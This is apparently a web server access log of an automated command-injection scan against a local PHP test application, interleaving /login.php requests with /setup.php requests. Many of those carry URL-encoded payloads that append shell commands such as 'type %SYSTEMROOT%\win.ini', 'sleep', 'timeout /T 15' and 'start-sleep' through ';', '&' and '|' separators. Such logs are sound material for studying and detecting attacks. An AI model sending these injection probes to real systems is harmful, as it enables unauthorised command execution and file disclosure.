172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php?query=query%3Bsleep+%7B0%7D%3B HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php?query=query%26type+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php?query=query%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php?query=query%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22 HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php?query=query%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php?query=query%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27 HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php?query=query%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php?query=query%26timeout+%2FT+15 HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php?query=query%7Ctimeout+%2FT+15 HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php?query=query%22%26timeout+%2FT+15%26%22 HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php?query=query%22%7Ctimeout+%2FT+15 HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php?query=query%26timeout+%2FT+%7B0%7D%26 HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php?query=query%7Ctimeout+%2FT+%7B0%7D HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php?query=query%3Bget-help HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php?query=query%22%3Bget-help HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php?query=query%27%3Bget-help HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php?query=query%3Bget-help+%23 HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php?query=query%3Bstart-sleep+-s+15 HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php?query=query%22%3Bstart-sleep+-s+15 HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php?query=query%3Bstart-sleep+-s+%7B0%7D HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php?query=query%3Bstart-sleep+-s+15+%23 HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
